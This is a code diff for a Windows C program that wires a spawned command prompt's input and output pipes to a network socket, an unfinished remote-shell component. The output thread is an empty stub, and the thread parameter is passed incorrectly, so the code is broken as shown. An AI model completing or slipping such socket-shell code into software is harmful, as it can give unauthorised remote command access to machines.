@@ -13,12 +13,17 @@ struct cmdGlobalsStruct {
     HANDLE cmdIn;
 } cmdGlobals;
 
+struct cmdThreadParamStruct {
+    HANDLE cmdOut;
+    SOCKET cmdSock;
+};
+
 // TODO - finish modifying this code and cleaning up as much as possible
 #include <tchar.h>
 #include <stdio.h>
 #include <strsafe.h>
 
-int startCMD();
+int startCMD(SOCKET sock);
 int createCommandPrompt();
 
 
@@ -27,12 +32,26 @@ int createCommandPrompt();
 *
 *
 */
-int startCMD() {
+int startCMD(SOCKET sock) {
     // create the child process with I/O pipes
     int retCode = createCommandPrompt();
     if (retCode != 0) {
         return retCode;
     }
+    // create the output thread
+    cmdThreadParamStruct* cmdThreadParams = (cmdThreadParamStruct*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(cmdThreadParamStruct));
+    cmdThreadParams->cmdOut = cmdGlobals.cmdOut;
+    cmdThreadParams->cmdSock = sock;
+    HANDLE thread;
+    DWORD threadID;
+    thread = CreateThread(
+        NULL,
+        0,
+        cmdOutputThread,
+        &cmdThreadParams,
+        0,
+        &threadID
+    );
 }
 
 /*
@@ -107,7 +126,20 @@ int createCommandPrompt() {
         CloseHandle(g_hChildStd_OUT_Wr);
         CloseHandle(g_hChildStd_IN_Rd);
     }
+}
 
+int inputToCMD(char* buff, int inputLen) {
+    DWORD written;
+    bool success;
+    // TODO - loop this to make sure everything gets written
+    if(!WriteFile(cmdGlobals.cmdIn, buff, inputLen, &written, NULL)) {
+        return GetLastError();
+    }
+    return 0;
+}
+
+DWORD WINAPI cmdOutputThread(LPVOID lpParam) {
+    // TODO - make thread handler
 }
 
 /*
